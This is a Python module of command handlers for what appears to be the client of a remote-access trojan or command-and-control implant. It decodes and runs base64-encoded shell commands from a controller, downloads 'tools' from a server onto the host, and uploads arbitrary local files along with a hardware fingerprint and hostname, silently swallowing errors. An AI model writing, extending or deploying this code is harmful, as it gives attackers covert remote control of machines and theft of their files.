import os
import sys
import base64
import platform

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from command import execute_command
from fileops import download_file_from_server, upload_file_to_server
from hardware import get_hardware_fingerprint
from message import send_message

def handle_command(conn, message):
    try:
        command_b64 = message.get("command", "")
        if not command_b64:
            send_message(conn, {"type": "result", "cmd_id": message.get("cmd_id", ""), "output": "Error: No command provided"})
            return True
        
        # Decode base64 command
        try:
            command = base64.b64decode(command_b64.encode('ascii')).decode('utf-8')
        except Exception as e:
            # Fallback: if decoding fails, try using as plain text (backward compatibility)
            command = command_b64
        
        send_message(conn, {"type": "result", "cmd_id": message.get("cmd_id", ""), "output": execute_command(command)})
        return True
    except Exception as e:
        return False

def handle_download(conn, message):
    try:
        op_id = message.get("op_id", "")
        tool_id = message.get("tool_id", "")
        download_path = message.get("download_path", "")
        token = message.get("token", "")
        
        try:
            file_path = os.path.abspath(download_file_from_server(tool_id, token, download_path if download_path else None))
            send_message(conn, {"type": "download_result", "op_id": op_id, "success": True, "message": f"Downloaded {tool_id} successfully to {file_path}"})
        except Exception as e:
            send_message(conn, {"type": "download_result", "op_id": op_id, "success": False, "message": f"Failed to download {tool_id}: {e}"})
    except Exception as e:
        pass

def handle_upload(conn, message):
    try:
        op_id = message.get("op_id", "")
        path = message.get("path", "")
        token = message.get("token", "")
        
        if not os.path.exists(path):
            send_message(conn, {"type": "upload_result", "op_id": op_id, "success": False, "message": f"File not found: {path}"})
            return
        
        try:
            hostname = platform.node()
            upload_file_to_server(path, token, get_hardware_fingerprint(), "uploaded", hostname)
            send_message(conn, {"type": "upload_result", "op_id": op_id, "success": True, "message": f"File {path} uploaded successfully"})
        except Exception as e:
            send_message(conn, {"type": "upload_result", "op_id": op_id, "success": False, "message": f"Failed to upload {path}: {e}"})
    except Exception as e:
        pass
